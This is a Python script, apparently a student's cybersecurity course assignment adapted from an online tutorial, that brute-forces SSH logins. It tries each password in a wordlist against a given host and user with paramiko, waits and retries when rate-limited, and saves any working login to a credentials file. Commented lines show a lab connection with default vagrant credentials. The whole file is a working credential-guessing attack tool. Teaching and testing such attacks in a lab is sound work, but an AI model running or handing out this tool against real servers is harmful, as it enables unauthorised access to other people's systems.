#!/usr/bin/env python3

# Script:                        Ops 401 Challenge 17
# Author:                        Jose Cardozo
# Date of latest revision:       02/07/2023
# Purpose:                       Automated Brute Force Wordlist Attack Tool Part 2 of 3

import paramiko
import time
import socket
from colorama import init, Fore


# Create an object of SSHClient and connect to SSH
# ssh = paramiko.SSHClient()

# Adding a new host key to the local device
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Initiates the SSH session to the remote machine
# ssh.connect('192.168.0.100', port=22, username='vagrant', password='vagrant', timeout=3)

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

def is_ssh_open(hostname, username, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    # Add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # This is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # Sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # Connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # Read the file
    passlist = open(passlist).read().splitlines()
    # Brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # If combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break


# This was from the internet here is the source:
# https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python